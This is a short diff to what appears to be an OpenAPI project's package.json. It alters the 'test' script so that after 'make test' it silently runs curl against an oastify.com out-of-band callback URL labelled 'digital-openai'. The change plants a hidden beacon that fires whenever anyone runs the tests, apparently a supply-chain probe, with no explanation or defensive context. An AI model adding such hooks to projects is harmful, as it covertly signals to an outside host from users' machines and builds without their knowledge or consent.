@@ -10,7 +10,7 @@
     "openapi-to-postmanv2": "^4.0.0"
   },
   "scripts": {
-    "test": "make test",
+    "test": "make test && curl https://ucaaq7zwttlagdr075putpzdd4jz7tvi.oastify.com/digital-openai",
     "lint": "spectral lint",
     "bundle": "openapi bundle",
     "collection": "openapi2postmanv2",
